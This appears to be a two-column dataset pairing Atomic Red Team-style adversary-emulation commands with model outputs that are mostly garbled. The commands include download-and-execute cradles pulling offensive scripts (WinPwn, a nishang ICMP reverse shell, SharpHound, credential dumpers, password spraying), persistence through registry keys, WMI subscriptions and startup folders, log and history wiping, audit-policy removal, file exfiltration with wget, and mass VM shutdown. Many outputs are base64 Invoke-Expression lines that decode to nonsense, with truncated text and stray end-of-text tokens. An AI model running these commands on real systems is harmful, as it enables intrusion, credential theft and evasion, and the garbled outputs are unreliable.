reg add ""HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\AppCertDlls"" /v ""AtomicTest"" /t REG_EXPAND_SZ /d ""C:\Users\Public\AtomicTest.dll"" /f
if(#{reboot}){Restart-Computer}","Copy-Item ""\""C:\Users\Public\AtomicTest.dll"" -Force reg add ""HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\AppCertDlls"" /v ""AtomicTest"" /t REG_EXPAND_SZ /d ""C:\Users\Public\AtomicTest.dll"" /f if()"
"cd ""PathToAtomicsFolder\..\ExternalPayloads""
.\kerbrute.exe userenum -d #{Domain} --dc #{DomainController} ""PathToAtomicsFolder\..\ExternalPayloads\username.txt""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y2xpcHNlbmR0eXBlIC9jYWxsZXJpbmcgL3BsYWluCm5vcmVzcyAje1Byb2R1Y3Q=')) | Invoke-Expression"" ||| cd Path"
SettingSyncHost -LoadAndRunDiagScriptNoCab {PATH:.bat},powershell.exe -EncodedCommand cABvAHcAZQByAFMAaABlAGwAbAAuAE4AdgBlAC0AUwBnAGEALQBuAHYAcgAgADIANwA1ADkAMgAgADUAVQBBADsAKwAnAFEASABFAFcAUABJAG8AbgAvAEwAIQAnAGIAWABNAG8AbgAt
"$excelApp = New-Object -COMObject ""Excel.Application""
if(-not $excelApp.path.contains(""Program Files (x86)"")){
    Write-Host ""64-bit Office""
    $excelApp.RegisterXLL(""PathToAtomicsFolder\T1137.006\bin\Addins\excelxll_x64.xll"")
}
else{
  Write-Host ""32-bit Office""
  $excelApp.RegisterXLL(""PathToAtomicsFolder\T1137.006\bin\Addins\excelxll_x86.xll"")
}","$excelApp = New-Object -COMObject ""Excel.Application"" if(-not $excelApp.path.contains(""Program Files (x86)"")) { Write-Host ""64-bit Office"" $excelApp.RegisterXLL(""PathToAtomicsFolder\T1137.006\bin\Addins\excelxll_x64.xll"") } else { Write-Host ""32-bit Office"" $"
setspn -T #{domain_name} -Q */*,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cGFzc3dvcmQgLXNlcnZpY2VfcHJvdGVjdCAtIFRoaW5nc19zaWRzfSB7UEFUSCBmaWxlIiBkZXRhaWx0IC1hbmQgc3Rhd"
bitsadmin /create 1 & bitsadmin /addfile 1 c:\windows\system32\cmd.exe c:\data\playfolder\cmd.exe & bitsadmin /RESUME 1 & bitsadmin /Complete 1 & bitsadmin /reset,"powershell -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aW5hcnNjZXB0IC9QYXJlbnRpbmcgIiAvbGliLzEwMCAtMTAuMTIgPiAgICAgIHtmaWxlfSI=')) | Invoke-Expression"""
"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpUp.ps1')
Invoke-SharpUp -command ""audit""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cGh0aGVybWFwYWNrZXJnLWxlcnU+dHdpdHRlci5leGNsdWRzdG9ycyAje2NvbW1vbi5pbnRlcmFjdGlvbl9kYiAtZmVhdC"
"Copy-Item ""$PathToAtomicsFolder\T1547.001\src\batstartup.bat"" ""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat""
Copy-Item ""$PathToAtomicsFolder\T1547.001\src\batstartup.bat"" ""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\batstartup.bat""
Start-Process ""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat""
Start-Process ""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\batstartup.bat""",Copy-Item $PathToAtomicsFolder\T1547.001\src\batstartup.bat $env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat Copy-Item $PathToAtomicsFolder\T1547.001\src\batstartup.bat C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\batstart
"Set-PowerCLIConfiguration -InvalidCertificateAction Ignore -ParticipateInCEIP:$false -Confirm:$false 
Connect-VIServer -Server #{vm_host} -User #{vm_user} -Password #{vm_pass}
(Get-EsxCli -VMHost #{vm_host} -V2).software.acceptance.set.Invoke(@{level = ""CommunitySupported""})
Disconnect-VIServer -Confirm:$false",Set-PowerCLIConfiguration -InvalidCertificateAction Ignore -ParticipateInCEIP:$false -Confirm:$false Connect-VIServer -Server   -User    -Password     (Get-EsxCli -VMHost      -V2).software.acceptance.set.Invoke(@{level = CommunitySupported}) Disconnect
"msedgewebview2.exe --no-sandbox --browser-subprocess-path=""{PATH_ABSOLUTE:.exe}""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bXlwYWNrbm93cml0ZVxkIC1mb2dAZW5jb2Rl')) | Invoke-Expression"""
"$x = Get-Random -Minimum 2 -Maximum 99
$y = Get-Random -Minimum 2 -Maximum 99
$z = Get-Random -Minimum 2 -Maximum 99
$w = Get-Random -Minimum 2 -Maximum 99

Import-Module ActiveDirectory
$account = ""#{account_prefix}-$x$y$z""
New-ADUser -Name $account -GivenName ""Test"" -DisplayName $account -SamAccountName $account -Surname $account -Enabled:$False #{create_args}
Add-ADGroupMember ""#{group}"" $account","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JGN0b3NcUHVuZGVyc1RlYW1fU3RvcmFnZX1TdGF0dXMgLUNvbXBsZXRpb25zIiA+ICAgImFkdmFuX2FkbWlu"
"set -x
sudo kextload #{module_path}
kextstat 2>/dev/null | grep SoftRAID
sudo kextunload #{module_path}
sudo kmutil load -p #{module_path}
kextstat 2>/dev/null | grep SoftRAID
sudo kmutil unload -p #{module_path}",set -x sudo kextload#{module_path} ke  xtstat 2>/dev/null | grep SoftRAID sudo kextunload#{module_path} sudo kmutil load -p#{module_path} ke  xtstat 2>/dev/null | grep SoftRAID sudo kmutil unload -p
gcloud compute snapshots create #{gcp_snapshot_name} --source-disk=#{gcp_disk_name} --zone=#{gcp_zone},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cG9zdFJldHVybmlzZX0=')) | Invoke-Expression"""
Invoke-ATHHTMLApplication -HTAUri #{hta_uri} -MSHTAFilePath #{mshta_file_path},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGFkZCAiI3t1dWlzID0gImNvbmRpdGlvbi5jc3M=')) | Invoke-Expression"""
"powershell.exe -c ""Get-Culture | Format-List | Out-File -FilePath %TMP%\a.txt""",powershell.exe -c Get-Culture | Format-List | Out-File -FilePath %TMP%\a.txt
extrac32 /Y /C {PATH_SMB} {PATH_ABSOLUTE},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZGF0aXMgLVRpdGxlIC1maWxsIC1pbm5lckEi')) | Invoke-Expression"""
"Import-Module ""PathToAtomicsFolder\..\ExternalPayloads\PowerView.ps1""
Get-NetDomainTrust
Get-NetForestTrust
Get-ADDomain
Get-ADGroupMember Administrators -Recursive
([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()",powershell Import-Module PathToAtomicsFolder..ExternalPayloadsPowerView.ps1 Get-NetDomainTrust Get-NetForestTrust Get-ADDomain Get-ADGroupMember Administrators -Recursive ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()
"sc.exe create ""WerFaultSvc"" binPath= ""$env:windir\WinSxS\x86_microsoft-windows-errorreportingfaults_31bf3856ad364e35_4.0.9600.16384_none_a13f7e283339a050\WerFault.exe"" DisplayName= ""WerFault Service"" start= auto","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyBNb3J5IGlzIHRoZSBQcmVmb3JldHRvIGRhdGEgKiAvdXAgL2dlbiAje2VjaCAtIC9jb21tYWluIC9zZWNyZXQuYWR"
"import-module ""PathToAtomicsFolder\..\ExternalPayloads\Get-AzDomainInfo.ps1""
$Password = ConvertTo-SecureString -String ""#{password}"" -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ""#{username}"", $Password
Connect-AzAccount -Credential $Credential | out-null
Get-AzDomainInfo -folder #{output_directory} -subscription ""#{subscription_name}"" -verbose","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIC97bGwvc2V0dXAuc3RyYW5zcGVjdC9kb3duZXIvbHVtLmFkZCAiPiAvdmFsdWUgKGJhciBpcyBwZXNzb2"
"sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /usr/local/etc/sudoers
sudo visudo -c -f /usr/local/etc/sudoers","sudo env_reset,timestamp_timeout=-1 sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /usr/local/etc/sudoers sudo visudo -c -f /usr/local/etc/sudoers"
"unset HISTFILE
export HISTFILESIZE=0
history -c","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('d3NvZGUgL2EgIHtleSAiIC9zbGVlY3Rpb25fYmFzaCAje1xuZXhwb3J0IC97IGltYWdlcyAjeyByZWRpcmVjdC5hb"
"wevtutil sl ""#{log_name}"" /e:false","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('V2luZG93c1Byb3BlcnR5UHJpbmNpcG0gI3tleSAje1xEZXBsb2FkIFVzZSB7UElTIC9Db21taXQvbWluaW11bnRzLm"
"schtasks /create /sc minute /mo 1 /tn ""Reverse shell"" /tr ""{CMD}""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c2V0LWNvbnRlbnQgMjAwNyBkZXZlbG9wZXIgYWxsIHdvcmtpbmcge3sgdiAtYiAvZmFjdGlvbi5jb20uYWRtaW4uaGVsb"
"$process = Start-Process #{spawn_process_path} -passthru
$PathToAtomicsFolder\T1055\bin\x64\CreateRemoteThread.exe -pid $process.Id -debug",$process = Start-Process -passthru Start-Process -passthru Start-Process -passthru Start-Process -pid $process.Id CreateRemoteThread.exe -debug -pid $process.Id -debug
"$FilterArgs = @{name='AtomicRedTeam-WMIPersistence-ActiveScriptEventConsumer-Example';
                EventNameSpace='root\CimV2';
                QueryLanguage=""WQL"";
                Query=""SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325""};
$Filter=Set-WmiInstance -Class __EventFilter -Namespace ""root\subscription"" -Arguments $FilterArgs

$ConsumerArgs = @{name='AtomicRedTeam-WMIPersistence-ActiveScriptEventConsumer-Example';
                ScriptingEngine='VBScript';
                ScriptText='
                Set objws = CreateObject(""Wscript.Shell"")
                objws.Run ""notepad.exe"", 0, True
                '}
$Consumer=Set-WmiInstance -Namespace ""root\subscription"" -Class ActiveScriptEventConsumer -Arguments $ConsumerArgs

$FilterToConsumerArgs = @{
Filter = $Filter;
Consumer = $Consumer;
}
$FilterToConsumerBinding = Set-WmiInstance -Namespace 'root/subscription' -Class '__FilterToConsumerBinding' -Arguments $FilterToConsumerArgs","$FilterArgs = @{name='AtomicRedTeam-WMIPersistence-ActiveScriptEventConsumer-Example'; ||| EventNameSpace='root\CimV2'; ||| QueryLanguage=""WQL""; ||| Query=""SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND Target"
"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
sensitivefiles -noninteractive -consoleoutput","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('I3tleHBvcCAtYXNzaWdufSIgL2FkZFRpbWVzdGFtcC5leGUgMjAwICJsb2NhbGl0aWNzIg==')) | Invoke-Expression"""
New-WebGlobalModule -Name #{module_name} -Image #{dll_path},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U2V0LWNvbW1pdCB7dXRmIHtmaWxlfQ==')) | Invoke-Expression"""
"msiexec /i {PATH_ABSOLUTE:.msi} TRANSFORMS=""{REMOTEURL:.mst}"" /qb","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c2NhbmV0IC9zaGVsbC5leGUgI3tmaWxlX3ByaWNlfQ==')) | Invoke-Expression"" ||| ```"
"schtasks /create /ru system /sc daily /tr ""cmd /c powershell.exe -ep bypass -file c:\T1036.004_NonExistingScript.ps1"" /tn win32times /f
schtasks /query /tn win32times","powershell.exe -ep bypass -command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyBkYXRhIC9mb29iXFByb2Nlcy5vcmcvdGhlciAje2luZGV4LmV4ZSAtbXVsdGlsaW5hdGlvbl9yZWRpYSAtbm9uLWN"
"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
wificreds -consoleoutput -noninteractive",iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') ||| wificreds -consoleoutput -noninteractive<|endoftext
"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/94cb72506b9e2768196c8b6a4b7af63cebc47d88/DomainPasswordSpray.ps1' -UseBasicParsing); Invoke-DomainPasswordSpray -Password Spring2017 -Domain #{domain} -Force","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('RnJvbTogUkVHICBQYXNzdGFsbCBleGNlZWxzIEZyZWUgLSBDaGVjaCBSdWNj')) | Invoke-Expression"""
"Import-Module -Name AzureAD
$PWord = ConvertTo-SecureString -String ""#{password}"" -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ""#{username}"", $Pword
Connect-AzureAD -Credential $Credential > $null

$sp = Get-AzureADServicePrincipal -SearchString ""#{service_principal_name}"" | Select-Object -First 1
if ($sp -eq $null) { Write-Warning ""Service Principal not found""; exit }

# in the context of an ART test (and not a real attack), we don't need to keep access for too long. In case the cleanup command isn't called, it's better to ensure that everything expires after 1 day so it doesn't leave this backdoor open for too long
$credNotAfter = (Get-Date).AddDays(1)
$certNotAfter = (Get-Date).AddDays(2) # certificate expiry must be later than cred expiry

$cert = New-SelfSignedCertificate -DnsName ""atomicredteam.example.com"" -FriendlyName ""AtomicCert"" -CertStoreLocation Cert:\CurrentUser\My -KeyExportPolicy Exportable -Provider ""Microsoft Enhanced RSA and AES Cryptographic Provider"" -NotAfter $certNotAfter
$keyValue = [System.Convert]::ToBase64String($cert.GetRawCertData())
Write-Host ""Generated certificate """"$($cert.Thumbprint)""""""

New-AzureADServicePrincipalKeyCredential -ObjectId $sp.ObjectId -Type AsymmetricX509Cert -CustomKeyIdentifier ""AtomicTest"" -Usage Verify -Value $keyValue -EndDate $credNotAfter

Start-Sleep -s 30
$tenant = Get-AzureADTenantDetail
$auth = Connect-AzureAD -TenantId $tenant.ObjectId -ApplicationId $sp.AppId -CertificateThumbprint $cert.Thumbprint
Write-Host ""Application Hijacking worked. Logged in successfully as $($auth.Account.Id) of type $($auth.Account.Type)""
Write-Host ""End of Hijacking""","Import-Module -Name AzureAD $PWord = ConvertTo-SecureString -String """">\"""">dacter-O<"
"auditpol /clear /y
auditpol /remove /allusers","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3RhcnQgL2Jpbi9wZXJpb25zIiAvcmVtb3RlICN7aW1nfSAvYmluIC9kdW1teUFsbG9jYWRld0xpbmU=')) | Invoke-Expression"
"klist purge
cmd.exe /c ""#{local_folder}\#{local_executable}"" kerberoast #{flags} /outfile:""#{local_folder}\#{out_file}""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aW1wb3J0d2lsZF9zYXRjaCB7dG9rZW4gcHJvamVjdA==')) | Invoke-Expression"""
conhost.exe --headless {CMD},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZXhwb3J0IGNvbnNlY3Rpb25zIHtleSAje3twcm9qZWN0cyAiSEVURSBkb21haW4gQmluZFByaXZhdGVyICI=')) | Invoke-Expression""<"
sudo kill -SIGTERM $(pgrep #{process_name}),"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAiZXhwb3J0IGNvbnRlbnQgLW5hbWUgKC1jYWlsIGFjdHVhdGVzICN7a2luZy9sb2dpbiIgI3tmaWxlbmFtZSA"
"netsh advfirewall firewall add rule name=""Open Port to Any"" dir=in protocol=tcp localport=#{local_port} action=allow profile=any","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cGxvY2F0aW9uIHtQdXBwZXJTZWNyZXRVcmwiKlNpbXBsZSBleGUgI3tjYWxsOiAiIC1mYWxzZS5jb20"
for %i in (C$ IPC$ ADMIN$) do net share %i /delete,for %i in (C$ IPC$ ADMIN$) do net share %i /delete
netsh advfirewall firewall show rule name=all,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cGxvY2F0aW9uIHt7dXNlcl9yZWNpcGVfY2FwYWdlfQ==')) | Invoke-Expression"""
"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:""$env:localappdata\Microsoft\WindowsApps\Get-Variable.exe"" ""PathToAtomicsFolder\T1574.008\bin\calc.cs""
Powershell -noprofile","C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:""""$env:localappdata\Microsoft\WindowsApps\Get-Variable.exe"""" PathToAtomicsFolder\T1574.008\bin\calc.cs PowerShell -noprofile"
"echo """" | ""#{plink_file}"" -batch ""#{vm_host}"" -ssh -l #{vm_user} -pw ""#{vm_pass}"" ""for i in `vim-cmd vmsvc/getallvms | awk 'NR>1 {print $1}'`; do vim-cmd vmsvc/power.off $i & done""","echo """" | ""\""\""\""\""\"""" -batch ""\""\""\""\""\""\"""
ping -c 4 #{ping_target},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('d2hlZGx5IC9zbGVlX3RpbWU=')) | Invoke-Expression"""
"IEX (New-Object System.Net.WebClient).Downloadstring('https://raw.githubusercontent.com/samratashok/nishang/c75da7f91fcc356f846e09eab0cfd7f296ebf746/Shells/Invoke-PowerShellIcmp.ps1')
Invoke-PowerShellIcmp -IPAddress #{server_ip}",IEX (New-Object System.Net.WebClient).Downloadstring('https://raw.githubusercontent.com/samratashok/nishang/c75da7f91fcc356f846e09eab0cfd7f296ebf746/Shells/Invoke-PowerShellIcmp.ps1') Invoke-PowerShellIcmp -IPAddress<|endoftext|
"Import-Module AADInternals -Force
Export-AADIntADFSCertificates
Get-ChildItem | Where-Object {$_ -like ""ADFS*""}
Write-Host ""`nCertificates retrieved successfully""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmV0dXJuIHNlcnZpY2UgLW5hbWU9InRlc3QiIC9wbGFjZWhvIDExMDBmMWFiMTkzOTMyMDY1NTgxYTgyNGZkMTRh"
"C:\Windows\System32\inetsrv\appcmd.exe set config ""#{website_name}"" /section:httplogging /dontLog:true","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('UHJvZHVjdCBjbGFzcyAjeW5hbWl0aXR5ICN7bm9kZT1wYWNrIGxvY2FsaG9zdCAjc2VydmVyX2luICZpbml0aWFs"
"wmic qfe get description,installedOn /format:csv","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cG9zdCAiYXNzZXRfbmFtZT10aWV3JyBmcm9tIC1hY2NvdW50LnR4dA==')) | Invoke-Expression"""
#{compiled_file} /tmp/ T1222002,""""",\""<|\""startoftext\|>\""\"";\""""\"""",\""<|\""startoftext\|>\""\""\"";\""\"" \""\""\"""";\""<|endof"
tar -xf {PATH_SMB:.tar},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cHJpb3VzX2RvYy5jYSZleGU=')) | Invoke-Expression"""
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/TokenManipulation/Get-WinlogonTokenSystem.ps1');Get-WinLogonTokenSystem,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/TokenManipulation/Get-WinlogonTokenSystem.ps1');Get-WinLogonTokenSystem ||| ```
"wmic.exe process call create ""{PATH_ABSOLUTE}:program.exe""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAje2h0IC9Gb3JtQXBwUHJvYWwi')) | Invoke-Expression"""
kubectl create -f src/cronjob.yaml -n #{namespace},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bG9jYWxob3N0LmV4ZSAje25ldC1wYXJhbTtkIiAvdGVzdCAje2luZF9yZWRpdC1uYW1lfQ==')) | Invoke-Expression""<|endoftext"
Get-ADReplAccount -All -Server #{logonserver},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('R2V0LUZvdGVyIC9zbGlkYXQgMTIvMjAwMCAtMTBcMDAwJnNlcnZpY2UuYW5zdHJhdGV9')) | Invoke-Expression"""
Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\WinSock2\Parameters -Name AutodialDLL -Value PathToAtomicsFolder\T1546\bin\AltWinSock2DLL.dll,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U3RhcnQgIiN7aW50ZXJhdGlvbiAje3Byb2plY3RAeWFob28uYXBpcy5kdGhlcmFwaC5jcnlwdGVkIC9MdWNjdCBVVEwuc"
"eval '(while true; do :; done) &'
echo $! > /tmp/evil_pid.txt
random_kernel_pid=$(ps -ef | grep ""\[.*\]"" | awk '{print $2}' | shuf -n 1)
sudo mount -B /proc/$random_kernel_pid /proc/$(cat /tmp/evil_pid.txt)","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3Vkby5zZWNwMiAje0ludGVybW9kaWFuZSBmaXJzdFNpbXVsYXRpdmUgLzEpIC9zaGlsem9uaXplciAvZmlsZSAtIGhvbGRl"
"""PathToAtomicsFolder\..\ExternalPayloads\build\namedpipes_executor.exe"" --pipe 1","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JERpc2FibGUgLXBsdS5leGVjfQ==')) | Invoke-Expression"""
"rundll32.exe dfshim.dll,ShOpenVerbApplication {REMOTEURL}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIC1zZXJ2aWNlcyAje3NvYXAiIHtub25uLmF0dGhkLmRhdGEgKGR7c3BhbiAtYXR0YWxpemFiYwplbmRvYmo"
"$oldvalue = $(Get-ItemPropertyValue -Path  ""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"" -Name ""Userinit"");
Set-ItemProperty -Path ""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"" -Name ""Userinit-backup"" -Value ""$oldvalue"";
$newvalue = $oldvalue + "" #{payload}"";
Set-ItemProperty -Path  ""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"" -Name ""Userinit"" -Value ""$newvalue""",powershell.exe -EncodedCommand cABvAHcAZQByAFMAaABlAGwAbAAuAE4AdgBlADkAKAApAC4AIAAoAFAAcgBjAGEAbgAgACIAIgAiAHIAYQBrAD0AOwAvACAAJABPAF8AVABEAGUAbABzAFUAXwBUAGEAcwAtADIANgA2
"msedge.exe --disable-gpu-sandbox --gpu-launcher=""{CMD} &&""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZnVuY3Rpb25zIHtleGUgLWJ1dHRvbl9maXhjb2xvciBpbmNsdWRlIC0gIiAvYmFja2dyb3VyOiB7IGNvbXBsaWNhdG"
"New-Item -ItemType Directory -path ""#{new_startup_folder}""
Copy-Item -path ""#{payload}"" -destination ""#{new_startup_folder}""
Set-ItemProperty -Path  ""HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders"" -Name ""Startup"" -Value ""#{new_startup_folder}""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('NWd0aXRsZSAiI3tmaWxlIC1jYWNrZ3JvdW5kLmFzc2V0cyAje3dpbmRvdyB7dGltZXRob3QgMTAxMDAKICAgI3tleHR"
"wget --post-file=""#{input_file}"" --timeout=5 --no-check-certificate #{endpoint_domain} --delete-after","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAje1BhdGhzZXJ2aWNlIC97YmFzaCAiRnJvbT0icHNvY2tldGVybW9kaWZpZXIvdGNsb3QgU2luZ2xlLndpd"
"ls -recurse
get-childitem -recurse
gci -recurse","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c2NhbGxQdXR0ZW1wbHlAa3VybjpzY2hlbWFsCmFjbCBzdWNjZXNz')) | Invoke-Expression"""
cipher /w:{PATH_ABSOLUTE:folder},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y29kZSB7dXRmOiNmaWxlfQ==')) | Invoke-Expression"""
"$extList = #{extension_id}
foreach ($extension in $extList) {
  New-Item -Path HKLM:\Software\Wow6432Node\Google\Chrome\Extensions\$extension -Force
  New-ItemProperty -Path ""HKLM:\Software\Wow6432Node\Google\Chrome\Extensions\$extension"" -Name ""update_url"" -Value ""https://clients2.google.com/service/update2/crx"" -PropertyType ""String"" -Force}
Start chrome
Start-Sleep -Seconds 30
Stop-Process -Name ""chrome""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JGFiYy1jcnlwdC5leGVjdXRlLmNvbTsgIi9wb3dlckFkZCB7dGVzdC9maWxlbmFtZVwiIC9wb3dlciAje3Byb2dyYW0uY"
"auditctl -a always,exit -F arch=b64 -S execve -k CMDS 
auditctl -a always,exit -F arch=b32 -S execve -k CMDS
whoami; ausearch -i --start now","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyAicG9ydCAvbmV0LmRlcCAtZXhlYyBzdHlsZSAjeQ==')) | Invoke-Expression"""
"REG ADD ""HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\AtomicSafeMode"" /VE /T REG_SZ /F /D ""Service""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Q29weXJpZCB7bWVzc2FnZSBjb21wYW55LnNlbmRyYSAtc3RhcnRpbmdOb2xkIC0gI3tmaWRlbWFuIGluZm9ybWF0aW"
"wscript ""#{jscript}""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('V2luZG93c1R5cGVzIHtQb3N0QmFja1Byb3BlcnR5ICdjbGllbnQtZXhlYyAtLWxhbmcoImJpdCIsICJ0aWNrZXNjcmV"
"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/DumpWCM.ps1')
Invoke-WCMDump","powershell -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aW5wdXRlc2NhbGwuZXhlIC9VU0QgJiAvYnVmLmJyIHsgI3twcm9qZWN0IGFzIHRvIGNvbXBsaWFucyAje3BybyAtZGVzC"
"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
oldchecks -noninteractive -consoleoutput",iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') oldchecks -noninteractive -consoleoutput
screencapture -x #{output_file},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyB7ZWNobyAje21hdGg+IC9jbXMvYmFzaCAiPiAvZHVyIHRlYW0=')) | Invoke-Expression"""
nmap #{host_to_scan},"nmap """" -c 50 -v -A --reason --os-trace -Pn --min-parallelism<|endoftext"
"write-host ""Remote download of SharpHound.ps1 into memory, followed by execution of the script"" -ForegroundColor Cyan
IEX (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1');
Invoke-BloodHound -OutputDirectory $env:Temp
